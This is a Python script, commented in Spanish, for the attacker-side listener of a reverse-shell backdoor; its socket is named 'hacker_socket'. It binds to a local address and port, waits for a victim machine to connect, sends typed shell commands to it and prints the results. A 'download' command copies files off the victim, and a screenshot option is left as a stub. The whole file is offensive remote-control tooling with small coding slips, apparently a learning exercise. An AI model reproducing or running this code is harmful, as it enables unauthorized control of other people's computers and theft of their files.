import socket

# Marcadores de identificación
IDENTIFIER = "<FIN_DEL_RESULTADO_DEL_COMANDO>"
eof_identifier = "<FIN_DEL_IDENTIFICADOR_DE_ARCHIVO>"
CHUNK_SIZE = 2048

def receive_file():
    print("Recibiendo archivo")


if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.100.62"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Escuchando solicitudes de conexión entrantes")
    hacker_socket, client_address = hacker_socket.accept()
    print("Conexión establecida con ", client_address)
    try:
        while True:
            command = input("Ingrese el comando ")
            hacker_socket.send(command.encode())
            if command == "stop":
                hacker_socket.close()
                break

            elif command == "":
                continue

            elif command.startswith("cd"):
                hacker_socket.send(command.encode())
                continue
            elif command.startswith("download"):
                hacker_socket.send(command.encode())
                exist = hacker_socket.recv(1024)
                if exist.decode() == "yes":
                    print("El archivo existe")
                    # Recibir archivo aquí
                    file_name = command.strip("download ")

                    with open(file_name, "wb") as file:
                        print("Descargando archivo")
                        while True:
                            chunk = hacker_socket.recv(CHUNK_SIZE)

                            if chunk.endswith(eof_identifier.encode()):
                                chunk = chunk[:-len(eof_identifier)]
                                file.write(chunk)
                                break
                            file.write(chunk)
                    print("Descargado exitosamente, ", file_name)

                else:
                    print("El archivo no existe")
                    continue
            elif command == "screenshot":
                print("Tomando captura de pantalla")
            else:
                full_command_result = b''
                while True:

                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result += chunk
                print(full_command_result.decode())
    except Exception:
        print("Ocurrió una excepción")
        hacker_socket.close()
